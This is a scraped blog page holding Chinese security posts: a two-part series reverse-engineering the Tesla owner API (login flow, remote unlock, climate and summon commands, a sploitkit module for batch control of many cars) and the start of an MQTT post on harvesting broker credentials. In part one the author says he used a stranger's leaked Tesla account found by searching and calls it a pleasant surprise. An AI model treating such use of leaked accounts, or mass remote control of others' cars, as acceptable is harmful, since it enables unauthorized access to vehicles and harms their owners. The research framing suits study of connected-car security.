&lt;p&gt;这里的&lt;code&gt;{command}&lt;/code&gt;为操作指令，主要有door_unlock（ 解锁）、door_lock（ 锁车）、flash_lights（ 闪灯）、honk_horn（鸣笛）&lt;/p&gt;
&lt;p&gt;、auto_conditioning_start（开空调）、auto_conditioning_stop（关空调）、set_temps（设置温度）、actuate_trunk_rear（开后备箱）。除&lt;code&gt;set_temps&lt;/code&gt;操作指令外，均不需要post data。&lt;code&gt;set_temps&lt;/code&gt;我们之前抓过包，有&lt;code&gt;driver_temp&lt;/code&gt;和&lt;code&gt;passenger_temp&lt;/code&gt;两个参数，分别为驾驶位温度和副驾驶位温度。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1605327129175.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;/Users/aliceclaudia/work/Blog/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6tesla%E5%AE%9E%E7%8E%B0/%E4%B8%8B/images/control.png&#34; alt=&#34;control&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;召唤&#34;&gt;召唤&lt;/h4&gt;
&lt;p&gt;召唤功能的流程在上面已经分析清楚，我们只需要按照格式发送和接收数据就可以了。先来个websockets的例子：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;async def main():
    async with websockets.connect(&#39;ws://10.10.6.91:5678&#39;) as websocket:
        timestamp = round(time.time()*1000)
        ping = &#39;{&amp;quot;timestamp&amp;quot;:%d,&amp;quot;msg_type&amp;quot;:&amp;quot;control:ping&amp;quot;,&amp;quot;created:timestamp&amp;quot;:%d}&#39;%(timestamp,timestamp)
        await websocket.send(ping)
        recv = await websocket.recv()

asyncio.get_event_loop().run_until_complete(main())
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;接下来就根据上面分析的流程构造发送数据包即可。这里需要注意的是在发送&lt;code&gt;autopark:cmd_forward&lt;/code&gt;和&lt;code&gt;autopark:cmd_reverse&lt;/code&gt;类型的消息时，需要gps位置信息，这个信息位置需要在车辆的gps位置信息附近。所以这里需要先获取车辆的gps信息，在此基础之上做加减法操作即可。具体大家可自己动手操作实践。&lt;/p&gt;
&lt;h3 id=&#34;模块&#34;&gt;模块&lt;/h3&gt;
&lt;h4 id=&#34;初始化&#34;&gt;初始化&lt;/h4&gt;
&lt;p&gt;汽车的类编写完，接下来就要设计业务流程。&lt;/p&gt;
&lt;p&gt;为了实现批量控制，这里设计一个sessions的列表，存放车辆信息、token以及车辆的对象。这个sessions列表在模块加载时生成。加载的过程则根据&lt;code&gt;/data/config/account.conf&lt;/code&gt; 的账号列表进行遍历，遍历过程中判断存储在&lt;code&gt;/data/token/&lt;/code&gt;目录下的账号信息文件是否存在，如果存在则直接读取文件，不存在则登录该账户，登录成功后将信息、token存到&lt;code&gt;/data/token/&lt;/code&gt;目录下，并加信息和车辆对象append到sessions列表中，供运行时调用。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1605327144827.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;/Users/aliceclaudia/work/Blog/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6tesla%E5%AE%9E%E7%8E%B0/%E4%B8%8B/images/init.png&#34; alt=&#34;init&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;利用模块&#34;&gt;利用模块&lt;/h4&gt;
&lt;p&gt;先来看下splpitkit库模块如何编写,在&lt;code&gt;/teslasploit/modules/exploit&lt;/code&gt;目录下创建&lt;code&gt;tesla.py&lt;/code&gt;,并引用相关库，获取车辆信息代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;class Info(Module,teslaBase):

    path = &amp;quot;exploit/tesla&amp;quot;
    description = &amp;quot;获取车辆信息&amp;quot;
    config = Config({
        Option(
            &#39;vehicle&#39;,
            &amp;quot;车辆编号&amp;quot;,
            True,
        ): 1
    })
    def __init__(self):
        super().__init__()
        print(self.vehicle_list())
        
    def run(self):
        tasks = []
        vehicle = self.config.option(&amp;quot;vehicle&amp;quot;).value
        self.event_loop = asyncio.get_event_loop()
        carinfos = []
        if vehicle==0:
            for i in range(0,len(self.sessions)):
                task = asyncio.ensure_future(self.sessions[i][&amp;quot;object&amp;quot;].get_info(self.sessions[i][&amp;quot;id&amp;quot;]))
                tasks.append(task)
            self.event_loop.run_until_complete( asyncio.gather(*tasks))
        else:
            vehicle_session = self.sessions[vehicle - 1]
            tesla = vehicle_session[&amp;quot;object&amp;quot;]
            asyncio.run(tesla.get_info(vehicle_session[&amp;quot;id&amp;quot;]))
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面的path位use加载的路径，description位利用模块的描述，config是配置的参数选项，可以使用&lt;code&gt;show options&lt;/code&gt;查看，使用&lt;code&gt;set [key] [value]&lt;/code&gt;进行设置。&lt;code&gt;run&lt;/code&gt;方法则是执行run命令时调用。&lt;/p&gt;
&lt;p&gt;在类初始化的时候调用了获取汽车列表的操作，会打印出要控制的汽车，0代表所有，其他根据编号可单独控制。在&lt;code&gt;run&lt;/code&gt;方法中，你只需要遍历sessions列表就可以实现批量控制了。其他模块与其相似，改动其选项和调用的方法等即可。&lt;/p&gt;
&lt;p&gt;编写完成后即可运行测试，使用流程如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1605327220514.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;/Users/aliceclaudia/work/Blog/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6tesla%E5%AE%9E%E7%8E%B0/%E4%B8%8B/images/use.png&#34; alt=&#34;use&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;0x03-成果展示&#34;&gt;0x03 成果展示&lt;/h2&gt;
&lt;p&gt;一切准备就绪，录制了两小段视频给大家。我在安全客10月21日的直播中有分享，大家可以查看链接 &lt;a href=&#34;https://www.anquanke.com/post/id/220554&#34;&gt;https://www.anquanke.com/post/id/220554&lt;/a&gt;，有录屏直播、ppt和两个演示视频。&lt;/p&gt;
&lt;h2 id=&#34;0x04-总结&#34;&gt;0x04 总结&lt;/h2&gt;
&lt;p&gt;本系列文章通过逆向分析并编程实现对特斯拉汽车的批量远程控制功能。重点讲述了针对web和websocket的抓包与python3协程编程的知识，同时也讲述了如何利用第三方库快速高效的构建系统框架。&lt;/p&gt;
&lt;p&gt;注：本文中仅提供了部分代码，有些可以单独运行，有些则需要自己补充或根据自己思路去进行实现。&lt;/p&gt;
&lt;h2 id=&#34;0x05-第三方库&#34;&gt;0x05 第三方库&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/dhondta/python-asciistuff&#34;&gt;https://github.com/dhondta/python-asciistuff&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/dhondta/python-sploitkit&#34;&gt;https://github.com/dhondta/python-sploitkit&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/Robpol86/terminaltables&#34;&gt;https://github.com/Robpol86/terminaltables&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/aio-libs/aiohttp&#34;&gt;https://github.com/aio-libs/aiohttp&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/aaugustin/websockets&#34;&gt;https://github.com/aaugustin/websockets&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
">Hacking all the cars之Tesla API分析与利用（下）</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/hacking-all-the-cars-tesla-api-exploit-part-one/"" data-c="
          &lt;p&gt;该系列文章将通过逆向的方式分析Tesla远程api，并自己编写代码实现远程控制Tesla汽车。&lt;/p&gt;
&lt;h2 id=&#34;0x00-简介&#34;&gt;0x00 简介&lt;/h2&gt;
&lt;p&gt;Tesla自身的app具备控车的一些功能，如解锁、温度控制、充电、行车轨迹、召唤功能等。那么可能有朋友要问了，分析app自己实现的意义是什么呢？为什么不用官方提供的app呢？而且Github也有大量开源项目。&lt;/p&gt;
&lt;p&gt;最开始我也有同样的疑问，但是，当我去尝试了解后，发现分析api，自己可以拓展多种玩法：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;挖掘潜在的隐藏功能。在漏洞挖掘过程中，总会有一些未在界面显示，被开发者隐藏起来的一些功能。这些功能一旦被我们发现，对漏洞挖掘或者实现额外的功能都有帮助。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;实现批量控车功能。官方的APP同时只能控制一台汽车，无法控制多台。我们熟悉API后，我们则可以实现批量控制汽车，实现速度与激情中的控车场景，这想想都觉得很酷；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;熟悉Tesla业务流程，可以深入去挖掘漏洞；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;尽管目前网络上有很多Tesla的API代码或库，但是其他的车还没有。我们以Tesla为典型例子，可以将其思路和方法拓展到其他同类的汽车厂商中；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;个性化定制，通过API可以按照自己习惯定制流程，控制更加灵活。还可以拓展功能，如雨天自动关闭天窗，根据情况自动制热/冷却等。甚至可以做成一个商业产品；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;通过api调用，配合代理跳板实现隐藏自身，同时不会暴漏自己的imei、设备等，减少APP信息收集导致的隐私泄漏。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;记录下所有关于车的数据，进行数据分析。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;!-- more --&gt;
&lt;h2 id=&#34;0x01-制定控制功能&#34;&gt;0x01 制定控制功能&lt;/h2&gt;
&lt;p&gt;在开始分析前，先来列一个功能清单，在后续分析过程中防止浪费时间。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;获取车辆列表；&lt;/li&gt;
&lt;li&gt;获取车辆详细信息；&lt;/li&gt;
&lt;li&gt;实现远程操作，包括温度控制、开启后备箱、开车锁；&lt;/li&gt;
&lt;li&gt;通过召唤功能实现控制车前进后退；&lt;/li&gt;
&lt;li&gt;批量控制汽车。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;0x02-app分析&#34;&gt;0x02 APP分析&lt;/h2&gt;
&lt;p&gt;在分析之前，通过查看、搜索Tesla官方内容未发现存在官方的API文档。最终决定通过其官方提供的APP来进行分析。尽管有人发布Tesla API的文档，根据文档或Github的公开库会更快。但是我们本着探寻原理的态度以来使自己得到提升。&lt;/p&gt;
&lt;h3 id=&#34;获取app&#34;&gt;获取APP&lt;/h3&gt;
&lt;p&gt;Tesla官方的Android app是需要在Google play上下载的，通过&lt;a href=&#34;https://apps.evozi.com/apk-downloader/?id=com.teslamotors.tesla&#34;&gt;https://apps.evozi.com/apk-downloader/?id=com.teslamotors.tesla&lt;/a&gt;地址下载即可。&lt;/p&gt;
&lt;h3 id=&#34;提取api地址&#34;&gt;提取api地址&lt;/h3&gt;
&lt;p&gt;这里个人习惯不同，我通常会先使用apkurlgrep来获取APK文件中的url地址。apkurlgrep为golang语言编写的提取APK文件中输入点的程序。Github地址:&lt;a href=&#34;https://github.com/ndelphit/apkurlgrep&#34;&gt;https://github.com/ndelphit/apkurlgrep&lt;/a&gt;。按照Github文档安装即可。&lt;/p&gt;
&lt;p&gt;安装完成后，执行&lt;code&gt;apkurlgrep -a com.teslamotors.tesla.apk&lt;/code&gt; 等待显示结果即可。也可以将结果重定向到文件中。结果里有一些是多余的，找到一些我们关注的点即可。这里关注到有api的地址&lt;code&gt;owner-api.teslamotors.com&lt;/code&gt;的地址，和带有api关键字的路径内容。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1602723039734.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1602723045778.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;接下来使用jadx反编译源码，将上述发现的关键字在源码中搜索，可以发现这些内容在两个json的文件中。具体内容如下：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1602723052304.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;根据定义的常量，在去进行搜索，可以看到其代码的位置。当然这里可以看出Tesla做了混淆，尽管可以分析，但是分析起来很耗精力。这个先暂停，先抓包分析来看看。&lt;/p&gt;
&lt;h3 id=&#34;抓包分析&#34;&gt;抓包分析&lt;/h3&gt;
&lt;p&gt;直接使用抓包工具即可。根据个人习惯选择，本文使用的是Burpsuite。在抓包的过程中会遇到有一些post data的内容是乱码格式，观察其请求头就可以得知使用了gzip压缩，解码可以通过burp的decode即可查看。对于重放，则可以直接去掉其请求头中&lt;code&gt;content-encoding:gzip&lt;/code&gt;和&lt;code&gt;Accept-Encoding: gzip, deflate&lt;/code&gt;即可。另外为了方便分析，可以设置scope过滤掉除tesla之外的记录显示。&lt;/p&gt;
&lt;h3 id=&#34;登录请求分析&#34;&gt;登录请求分析&lt;/h3&gt;
&lt;p&gt;开启拦截，我们使用打开手机中的Tesla APP。按照提示进行正常登录，截获到的请求我们可以先查看下，然后通过。操作完登录的整个流程，可以了解到这里涉及到4个域名，分别为auth-global.tesla.com、auth.tesla.cn、auth.tesla.com、owner-api.teslamotors.com。&lt;/p&gt;
&lt;p&gt;其大致过程为先请求auth-global.tesla.com获取其地区，然后跳转到所属区域的服务，这里跳转到auth.tesla.cn，先显示的输入用户名，下一步后，跳转到auth.tesla.com域，显示用户名密码信息，输入用户名密码后也是经过auth.tesla.com。用户名密码正确，APP进行到程序主界面。 这里有两步，第一个先请求auth.tesla.com域获取jwt的token，第二将获取的jwt token带入请求owner-api.teslamotors.com。接下来的获取数据均请求到owner-api.teslamotors.com，由此也可以看出这个地址为api服务的地址，也就是最终我们只需要获取最后的那个token，就可以实现获取其他信息的操作。&lt;/p&gt;
&lt;p&gt;大致流程图如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-flow&#34;&gt;st=&amp;gt;start: 打开app
op=&amp;gt;operation: auth-global.tesla.com判断区域跳
op1=&amp;gt;operation: 跳转至auth.tesla.cn
op2=&amp;gt;operation: 跳转至auth.tesla.com
op3=&amp;gt;operation: APP主界面
op4=&amp;gt;operation: 获取jwt token
op5=&amp;gt;operation: 请求owner-api
e=&amp;gt;end: 获取用户信息
st(bottom)-&amp;gt;op(bottom)-&amp;gt;op1(bottom)-&amp;gt;op2(bottom)-&amp;gt;op3(bottom)-&amp;gt;op4(bottom)-&amp;gt;op5(bottom)-&amp;gt;cond
op5-&amp;gt;e

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里实现思路有如下几个：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;完全自己根据流程构造请求来获取。在实现过程中不仅有多个流程，还需要分析其请求中的参数，非常的麻烦。&lt;/li&gt;
&lt;li&gt;可以采用headless的方式，一些过程由浏览器来完成，只需要填入参数，点击按钮等操作即可。当然这里需要调用浏览器。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;上面的方式都比较麻烦，有没有更简单的方法呢？仔细思考下，既然owner-api.teslamotors.com是提供api服务的，那么Tesla也会有其他的调用方式，如web等，那么其登录可能会更简单。这里我还去分析了下web登录。但是其登录后并未去请求owner-api.teslamotors.com。&lt;/p&gt;
&lt;p&gt;而之前看网络上的api，只要发起一次请求就可以获取token，他们是如何获取的呢？&lt;/p&gt;
&lt;p&gt;第一种尝试，通过Tesla官方的其他登录点来分析，收集了tesla几个域的子域名，通过寻找登录地来分析，最终没有收获。&lt;/p&gt;
&lt;p&gt;第二种尝试，通过反编译的APK代码中搜索，通过查看可以确定tesla 采用了标准的oauth来实现，这里到发现对于owner-api.teslamotors.com的几种类型(grant_type)，分别有authorization_code、refresh_token、urn:ietf:params:oauth:grant-type:jwt-bearer。最后一种是app中登录用到的；refresh_token是用来刷新token的；authorization_code授权码模式(即先登录获取code,再获取token)。&lt;/p&gt;
&lt;p&gt;查了下资料，oauth支持5类 grant_type 。除上述用到的外，还有password模式。而公开的api就是这种模式。那么既然支持这种模式，请求的参数字段和内容又怎么来的呢？新版本的APP里没有这种模式，陷入沉思中。片刻后，决定尝试下载老版本APP去分析下，通过搜索引擎找了3.8.5的老版本。反编译，搜索&lt;code&gt;grant_type&lt;/code&gt;，结果眼前一亮，老版本的只有password模式。而且参数也写的非常明显了。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1602723063315.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;至于这里的参数client_id和client_secret参数在上文中发现的json文件中有。email和password就是我们的用户名和密码。&lt;/p&gt;
&lt;p&gt;至此，登录就分析完成了。我们可以直接构造一次请求，即可获取token了。后续在分析app的时候可以优先选择老版本入手。&lt;/p&gt;
&lt;h3 id=&#34;控制功能请求分析&#34;&gt;控制功能请求分析&lt;/h3&gt;
&lt;p&gt;登录后，要控制特斯拉汽车，先会获取账户所属的车辆。在APP中如果只有一辆车则直接现实车辆信息和控制界面，如果有两辆及以上，则会先选择要控制的车辆。&lt;/p&gt;
&lt;p&gt;我们登录成功后，只要我们在当前APP界面中，在Burp中会收到多次请求。这里还可以看到关于发送log的请求，这在自己实现api时则可以跳过这个记录。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;车辆列表&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;根据burp的历史记录，或者在拦截的时候拦截其相应内容来进行分析。通过分析可以看到获取vin，id号的请求是&lt;code&gt;/api/1/products&lt;/code&gt;，因为返回的格式为json，其信息都在因为返回内容在键，返回的内容中包含id号（id）、用户id（user_id）、vin、显示名字（display_name）、状态（state）等信息。这里id号后面会用到，对汽车进行的操作都是通过这里的id号。如果有两辆车以上，则遍历即可。&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;车辆详细信息&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;通过记录可以看到获取车辆详细信息的api地址为&lt;code&gt;/api/1/vehicles/{vehicle_id}/vehicle_data&lt;/code&gt; ，通过抓取停止状态和行驶状态下的数据，可以看到由&lt;code&gt;endpoints&lt;/code&gt;参数控制，值分别为&lt;code&gt;drive_state&lt;/code&gt;(行驶中)、&lt;code&gt;climate_state%3Bgui_settings&lt;/code&gt;、&lt;code&gt;climate_state%3Bcharge_state%3Bdrive_state%3Bgui_settings%3Bvehicle_state&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;对于行驶中的状态，通过api可以获取当前驾驶速度。&lt;/p&gt;
&lt;p&gt;这里根据返回的json进行分析即可。这里不做详细描述。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1602723074091.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;温度控制&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;采用同样的方式，在app中操作，在burp中进行拦截或者从sitemap，历史记录里去分析。&lt;/p&gt;
&lt;p&gt;要先调整温度，需要先开启，然后设置温度。也可以关闭温度控制。&lt;/p&gt;
&lt;p&gt;api地址为：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/api/1/vehicles/{vehicle_id}/command/auto_conditioning_start //开启温度控制

/api/1/vehicles/{vehicle_id}/command/auto_conditioning_stop  //关闭温度控制

/api/1/vehicles/{vehicle_id}/command/set_temps					//设置温度
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;开启和关闭使用空的json即可，或者去掉Content-Type头。&lt;/p&gt;
&lt;p&gt;设置温度的请求如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST /api/1/vehicles/{vehicle_id}/command/set_temps HTTP/1.1
user-agent: Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MOB31E; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.117 Mobile Safari/537.36
x-tesla-user-agent: TeslaApp/3.10.8-421/adff2e065/android/6.0.1
authorization: Bearer *****
Content-Type: application/json; charset=utf-8
Content-Length: 42
Host: owner-api.teslamotors.com
Connection: close

{&amp;quot;driver_temp&amp;quot;:22.5,&amp;quot;passenger_temp&amp;quot;:22.5}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1602723087973.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;在分析过程中还会出现响应头尾304的情况，一般出现在GET请求中，我们只需要去掉If-None-Match请求头即可。&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;其他&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;对于其他功能，分析方法都大致类似，了解了方法后，可以去分析其他的部分，然后对比已经公布的api文档来确认。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;召唤功能控车&#34;&gt;召唤功能控车&lt;/h3&gt;
&lt;p&gt;特斯拉在2016年推出了召唤功能，2019年推出了智能召唤功能。智能召唤功能支持车辆自主行驶避让障碍物，并能到达车主面前或者车主指定的位置，无需驾驶员在车内控制。当然这项功能对场地有一定要求，仅限于在“私家停车区域和行车道”使用，无法在公路上使用该功能。&lt;/p&gt;
&lt;p&gt;召唤功能不是使用的&lt;code&gt;owner-api.teslamotors.com&lt;/code&gt;，而是websocket通信，通信服务器为&lt;code&gt;streaming.vn.teslamotors.com&lt;/code&gt;。由于特殊原因，此次召唤功能将在下篇内容中介绍。&lt;/p&gt;
&lt;h3 id=&#34;分析结果&#34;&gt;分析结果&lt;/h3&gt;
&lt;p&gt;根据截获的流量信息，总结一下Telsa api的几个技术点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Tesla的大多数功能调用的是&lt;code&gt;owner-api.teslamotors.com&lt;/code&gt;的api接口；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用了oAuth 2 标准；APP采用jwt方式来获取api接口的token信息，其jwt加密方式为RS256；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;发起的请求除登录、找回密码功能外需要&lt;code&gt;Authorization: Bearer&lt;/code&gt; 请求头，后面内容为token，token具有有效期；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;召唤功能使用的是websocket的方式，其服务器地址&lt;code&gt;wss://streaming.vn.teslamotors.com/&lt;/code&gt;。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;0x03-编程实现&#34;&gt;0x03 编程实现&lt;/h2&gt;
&lt;p&gt;这里开发语言选择Python3，其版本使用的是3.8。采用异步编程，这里会选择使用aiohttp库。编程实现将在下篇内容中来详细说明。&lt;/p&gt;
&lt;p&gt;对于大多数人来说，没有车是分析的最大问题？&lt;/p&gt;
&lt;p&gt;我也面临同样的问题，每天上下班路上看着从自己身边路过的特斯拉，彷佛它在无情的嘲笑着我，心中不免泛起淡淡的忧伤。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1602723104961.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;抱怨改变不了现实，于是借助搜索大法，几分钟后，成功获取到一个韩国人的账号，此刻我露出了久违的微笑。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;8&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1602723142577.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;9&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1602723149573.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;本着负责任的态度，我们第一时间向泄漏账号的人发送了邮件。截止到目前，我们仍未收到回复的邮件。我们会持续跟进该事情进展，并会及时更新至本文。注：本文分析是利用自己的账号进行，意外获取他人账号只是一个小惊喜。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;10&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1602723157261.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;0x04-总结&#34;&gt;0x04 总结&lt;/h2&gt;
&lt;p&gt;本文通过对Tesla app逆向、抓包的方式分析出其api接口。通过本文的研究可以发现，汽车越来越智能化、方便的同时，却也引入了新的安全风险。尽管运用了很多复杂的技术来提高和保证其安全性。但是一旦黑客获取到用户名密码，就可以把Tesla开走。而获取用户名和密码的手段还是可以通过传统的方式来获得。在下一篇的文章中将尝试通过python编程实现利用API来批量控制特斯拉。&lt;/p&gt;
&lt;h2 id=&#34;0x05-参考&#34;&gt;0x05 参考&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://apps.evozi.com/apk-downloader/?id=com.teslamotors.tesla&#34;&gt;https://apps.evozi.com/apk-downloader/?id=com.teslamotors.tesla&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/ndelphit/apkurlgrep&#34;&gt;https://github.com/ndelphit/apkurlgrep&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://tesla-api.timdorr.com/&#34;&gt;https://tesla-api.timdorr.com/&lt;/a&gt;&lt;/p&gt;
">Hacking All The Cars之Tesla API分析与利用（上）</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/mqtt-security-part-two/"" data-c="
          &lt;p&gt;上一篇 &lt;a href=&#34;https://bacde.me/post/mqtt-security-part-one/&#34;&gt;物联网安全之MQTT协议安全 &lt;/a&gt;主要介绍了MQTT安全的一些基础知识。今天将在上一篇基础上来说说实战中MQTT的利用。&lt;/p&gt;
&lt;p&gt;在整个物联网或车联网架构中，MQTT的部分通常应用在移动端、管理端、Web端、设备端。而MQTT协议中的三种角色是发布者（PUBLISHER）、订阅者（SUBCRIBER）、代理（BROKER）。发布者（PUBLISHER）和订阅者（SUBCRIBER）通过代理（BROKER）来发布和订阅消息。这两个角色在实际场景中主要应用是移动端、Web端、设备端；代理（BROKER）一般是服务器，可以由activemq、hivemq、emqx等许多软件来搭建。在开发过程中，不同的设备，技术特点也有所不同。其使用的协议除了mqtt外，Web端通常使用websocket的方式来进行收发消息。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1599967523996.png&#34; alt=&#34;mqtt应用场景&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;center&gt;EMQ X Broker 场景&lt;/center&gt;
&lt;h2 id=&#34;0x00-获取mqtt认证信息&#34;&gt;0x00 获取MQTT认证信息&lt;/h2&gt;
&lt;p&gt;目前对于MQTT的开发中的安全还尚未受到广泛关注，这使得有多种方式在移动端、Web端、设备端获取到MQTT的认证与连接信息。通过获取的信息来进一步实现越权访问、发布恶意内容等攻击。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;p&gt;由于设备方面暂未找到案例，这里将以Web端和移动端案例来进行说明。&lt;/p&gt;
&lt;h3 id=&#34;开发的一点知识&#34;&gt;&lt;strong&gt;开发的一点知识&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;通过查阅一些开发资料，可以发现常见的几个MQTT的javascript库：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.hivemq.com/blog/mqtt-client-library-encyclopedia-paho-js&#34;&gt;Paho.js&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.hivemq.com/blog/mqtt-client-library-mqtt-js&#34;&gt;MQTT.js&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.hivemq.com/blog/mqtt-client-library-encyclopedia-mqttelements&#34;&gt;mqtt-elements&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.hivemq.com/blog/mqtt-client-library-mqtt-dart&#34;&gt;MQTT.DART&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在实际的研究过程中发现尤其以paho.js居多。在实际的渗透过程中需要多留意，使用本库基本可以确定Web端应用了MQTT的。以下我就介绍几个获取MQTT的几个小技巧。&lt;/p&gt;
&lt;h3 id=&#34;实战工具&#34;&gt;&lt;strong&gt;实战工具&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Chrome 浏览器&lt;/li&gt;
